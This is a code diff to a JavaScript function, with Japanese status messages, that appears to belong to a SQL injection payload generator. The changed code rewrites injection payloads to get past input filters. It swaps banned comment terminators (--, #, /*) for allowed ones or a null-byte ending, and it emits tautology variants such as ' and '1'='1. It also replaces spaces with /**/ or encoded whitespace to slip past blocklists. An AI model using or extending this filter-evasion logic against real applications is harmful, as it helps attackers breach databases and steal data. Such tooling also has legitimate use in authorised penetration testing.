@@ -159,16 +159,34 @@ function applyFilters(payload, active, mode, bans){
   const inlineBlocked=has("inline")||banHas("/*")||banHas("/**/");
   let p=payload;
 
-  if(has("comment")||has("inline")){
-    const before=p;
-    p=p.replace(/(\s*)(--\s*-|--|#|\/\*)\s*$/,"");
-    if(p!==before){
-      steps.push("行末コメントを除去: コメントが使えないため");
-      if(has("comment")&&has("inline")){
-        variants.push({t:"コメント無し 終端パターンA",p:p+" and '1'='1"});
-        variants.push({t:"コメント無し 終端パターンB",p:p+" or ('1')=('1"});
-        variants.push({t:"コメント無し 終端パターンC (Nullバイト)",p:p+";%00"});
-        warns.push("コメント禁止のため自分でクエリを閉じる必要あり (代替案参照)。%00 は古いPHP/APIでのみ有効。");
+  const dashBanned=has("dash")||has("comment")||banHas("--");
+  const hashBanned=has("hash")||has("comment")||banHas("#");
+
+  if(dashBanned||hashBanned||has("inline")){
+    const cm=p.match(/\s*(--\s*-|--|#|\/\*|;%00)\s*$/);
+    if(cm){
+      const tokRaw=cm[1];
+      const tok=tokRaw.startsWith("--")?"--":(tokRaw==="#"?"#":(tokRaw.startsWith("/*")?"/*":"%00"));
+      const bad=tok==="--"?dashBanned:(tok==="#"?hashBanned:(tok==="/*"?has("inline"):false));
+      const body=p.slice(0,p.length-cm[0].length);
+      if(bad){
+        let alt="";
+        if(tok==="--"&&!hashBanned) alt="#";
+        else if(tok==="#"&&!dashBanned) alt="-- -";
+        else if(!banHas(";")&&!banHas("%00")) alt=";%00";
+        if(alt){
+          p=body+alt;
+          steps.push("行末の "+tok+" は禁止のため "+alt+" に置換");
+        }else{
+          p=body;
+          steps.push("行末コメントを除去 (代替のコメント形式も禁止)");
+          variants.push({t:"コメント無し 終端パターンA",p:body+" and '1'='1"});
+          variants.push({t:"コメント無し 終端パターンB",p:body+" or ('1')=('1"});
+          variants.push({t:"コメント無し 終端パターンC (Nullバイト)",p:body+";%00"});
+          warns.push("コメント系トークンが全て禁止のため自分でクエリを閉じる必要あり (代替案参照)。%00 は古いPHP/APIでのみ有効。");
+        }
+      }else{
+        steps.push("行末の "+tok+" コメントは禁止対象外のため保持");
       }
     }
   }
@@ -325,31 +343,29 @@ function applyFilters(payload, active, mode, bans){
     let tail="";
     let body=p;
     if(cm){ tail=cm[0]; body=p.slice(0,p.length-tail.length); }
-    if(!inlineBlocked){
-      tail=banHas("#")?((banHas(";")||banHas("%00"))?"":";%00"):"#";
-    }else if(tail){
-      if(banHas("#")) tail=(banHas(";")||banHas("%00"))?"":";%00";
-      else tail="#";
-    }else{
-      tail="";
-    }
-    if(tail==="#"&&!banHas("--")) variants.push({t:"コメント # を -- に (PG/MSSQL/SQLite用。-- の後ろに改行 %0a を付ける)",p:body.replace(/\s+/g,"/**/")+"--%0a"});
+    let pick="";
+    if(!hashBanned&&!banHas("#")) pick="#";
+    else if(!dashBanned&&!banHas("--")) pick="--"+(wsAlts[0]||"");
+    else if(!banHas(";")&&!banHas("%00")) pick=";%00";
+    tail=pick;
     if(!inlineBlocked){
       const before=body;
       body=body.replace(/\s+/g,"/**/");
       if(body!==before) steps.push("スペースを /**/ に変換");
     }else if(wsAlts.length){
-      const pick=wsAlts[0];
+      const sel=wsAlts[0];
       const before=body;
-      body=body.replace(/\s+/g,pick);
-      if(body!==before){ steps.push("スペースを "+pick+" に変換 (禁止済みの代替を除外し、利用可能なものを自動選択)"); }
-      wsAlts.slice(1).forEach(t=>variants.push({t:"スペース→"+t,p:(body+tail).replace(new RegExp(pick.replace("%","\\%"),"g"),t)}));
+      body=body.replace(/\s+/g,sel);
+      if(body!==before){ steps.push("スペースを "+sel+" に変換 (禁止済みの代替を除外し、利用可能なものを自動選択)"); }
+      wsAlts.slice(1).forEach(t=>variants.push({t:"スペース→"+t,p:(body+tail).replace(new RegExp(sel.replace("%","\\%"),"g"),t)}));
     }else{
       warns.push("スペース代替 (%09 %0a %0b %0c %0d %a0) と /**/ が全て禁止 → 括弧グルーピング: 1'and(select(1)) の形式で組み立てること。");
     }
     p=body+tail;
-    if(tail==="#"&&!has("inline")) steps.push("末尾コメントを # に正規化 (-- の後続空白が問題になる環境対策。# が禁止なら %00 か引用符で自分で閉じる)");
-    if(tail==="") warns.push("コメント系トークンが全て禁止 → 出力はクエリを自分で閉じる必要あり (代替案の終端パターン参照)。");
+    if(pick==="#") steps.push("末尾コメントは # を選択 (-- が禁止のため / MySQL)");
+    else if(pick.startsWith("--")) steps.push("末尾コメントは --"+(wsAlts[0]||"")+" を選択 (# が禁止のため / -- の後続に空白相当が必要)");
+    if(pick==="") warns.push("コメント系トークンが全て禁止 → 出力はクエリを自分で閉じる必要あり (代替案の終端パターン参照)。");
+    if(pick==="#"&&!dashBanned&&!banHas("--")) variants.push({t:"コメント # を --%0a に (PG/MSSQL/SQLite用)",p:body.replace(/\s+/g,"/**/")+"--%0a"});
   }
 
   if(has("upper")||has("lower")||has("casecap")){
